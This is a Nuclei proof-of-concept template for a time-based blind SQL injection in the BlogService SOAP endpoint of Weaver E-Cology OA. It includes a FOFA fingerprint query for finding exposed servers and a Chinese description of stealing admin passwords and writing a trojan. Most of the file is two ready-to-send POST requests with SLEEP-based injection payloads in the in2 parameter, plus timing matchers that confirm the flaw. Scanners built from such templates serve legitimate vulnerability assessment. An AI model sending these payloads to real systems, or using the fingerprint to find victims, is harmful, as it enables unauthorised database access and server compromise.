common/config/pocs/nuclei-2025/泛微E-Cology-BlogService-SQL延时注入漏洞.yaml

id: WeaverOA-E-Cology-BlogService-sql
info:
  name: 泛微E-Cology BlogService SQL延时注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="泛微-OA（e-cology）"
    泛微E-Cology BlogService 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486868&idx=1&sn=03412f27928252b4cd115725ac5e72a4&chksm=c267b8a7f51031b1538c01d421b3abc3bc8b6296f0298507e6566483c600f432c7d2c1ebc175&token=522460222&lang=zh_CN#rd
  tags: sql injection



http:
  - raw:
      - |
        POST /services/BlogService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        Content-Type: text/xml;charset=UTF-8

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
          <soapenv:Header/>
          <soapenv:Body>
            <web:sendSubmitRemind>
              <!--type: string-->
              <web:in0>1</web:in0>
              <!--type: string-->
              <web:in1>2</web:in1>
              <!--type: string-->
              <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(4)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
            </web:sendSubmitRemind>
          </soapenv:Body>
        </soapenv:Envelope>
      - |
        POST /services/BlogService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        Content-Type: text/xml;charset=UTF-8

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
          <soapenv:Header/>
          <soapenv:Body>
            <web:sendSubmitRemind>
              <!--type: string-->
              <web:in0>1</web:in0>
              <!--type: string-->
              <web:in1>2</web:in1>
              <!--type: string-->
              <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(8)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
            </web:sendSubmitRemind>
          </soapenv:Body>
        </soapenv:Envelope>
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and






